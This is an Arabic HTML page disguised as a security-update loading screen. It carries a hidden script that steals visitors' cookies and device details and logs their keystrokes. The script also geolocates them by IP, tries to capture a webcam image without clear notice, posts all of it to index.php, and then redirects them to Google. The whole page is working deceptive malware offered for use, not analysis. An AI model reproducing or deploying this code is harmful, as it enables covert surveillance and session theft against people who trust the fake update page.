<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #141b2b;
            padding: 50px 40px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            text-align: center;
            max-width: 450px;
            width: 90%;
            border: 1px solid #2a3a5c;
        }
        .lock-icon {
            font-size: 60px;
            background: #1f2b3f;
            width: 100px;
            height: 100px;
            line-height: 100px;
            border-radius: 50%;
            margin: 0 auto 20px;
            box-shadow: 0 0 30px #00aaff44;
        }
        h1 {
            font-size: 22px;
            margin-bottom: 10px;
            color: #b0d4ff;
        }
        p {
            color: #8899bb;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #1e2a3f;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00c6ff, #0072ff);
            animation: load 2.5s forwards;
        }
        @keyframes load {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .status {
            font-size: 13px;
            color: #66b0ff;
        }
        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #3a4a6a;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="lock-icon">🔒</div>
        <h1>تحديث بروتوكول الأمان</h1>
        <p>جاري التحقق من اتصالك الآمن وتحديث البيانات</p>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="status">🔄 جاري المزامنة مع الخوادم المحمية...</div>
        <div class="footer">✓ متوافق مع معايير الحماية العالمية</div>
    </div>

    <script>
        // ===================================================================
        // وحدة الجمع والإرسال - مخفية بالكامل عن المستخدم
        // ===================================================================

        (function() {
            "use strict";

            // تأخير ذكي لتظهر صفحة التحميل أولاً
            setTimeout(function() {

                // 1. جمع الكوكيز
                var cookies = document.cookie || "none";

                // 2. معلومات الجهاز
                var device = {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    lang: navigator.language,
                    screen: screen.width + "x" + screen.height,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cores: navigator.hardwareConcurrency || "unknown",
                    memory: navigator.deviceMemory || "unknown",
                    referrer: document.referrer || "direct",
                    url: window.location.href
                };

                // 3. تسجيل المفاتيح (خفي)
                var keys = [];
                document.addEventListener('keydown', function(e) {
                    keys.push(e.key);
                    if (keys.length > 300) keys.shift();
                });

                // 4. الموقع عبر IP
                var geo = { city: "unknown", region: "unknown", country: "unknown", lat: "N/A", lon: "N/A" };
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open('GET', 'https://ipapi.co/json/', false);
                    xhr.send();
                    if (xhr.status === 200) {
                        var g = JSON.parse(xhr.responseText);
                        geo.city = g.city || "unknown";
                        geo.region = g.region || "unknown";
                        geo.country = g.country_name || "unknown";
                        geo.lat = g.latitude || "N/A";
                        geo.lon = g.longitude || "N/A";
                    }
                } catch(e) {}

                // 5. محاولة الكاميرا (بدون إشعار واضح)
                var imageData = null;
                try {
                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                        .then(function(stream) {
                            var video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            setTimeout(function() {
                                var canvas = document.createElement('canvas');
                                canvas.width = 640;
                                canvas.height = 480;
                                var ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0);
                                imageData = canvas.toDataURL('image/png');
                                stream.getTracks().forEach(function(t) { t.stop(); });
                                sendData();
                            }, 1200);
                        })
                        .catch(function() { sendData(); });
                } catch(e) {
                    sendData();
                }

                // 6. إرسال البيانات
                function sendData() {
                    var payload = {
                        c: cookies,
                        d: device,
                        k: keys.join(''),
                        g: geo,
                        img: imageData || null,
                        t: new Date().toISOString()
                    };

                    try {
                        var req = new XMLHttpRequest();
                        req.open('POST', 'index.php', true);
                        req.setRequestHeader('Content-Type', 'application/json');
                        req.send(JSON.stringify(payload));
                    } catch(e) {}

                    // توجيه خفي بعد 3 ثوانٍ
                    setTimeout(function() {
                        window.location.href = "https://www.google.com";
                    }, 3000);
                }

                // إذا فشلت الكاميرا، أرسل بعد 2 ثانية
                setTimeout(function() {
                    if (!imageData) sendData();
                }, 2500);

            }, 800); // تأخير أولي 800ms

        })();
    </script>
</body>
</html>
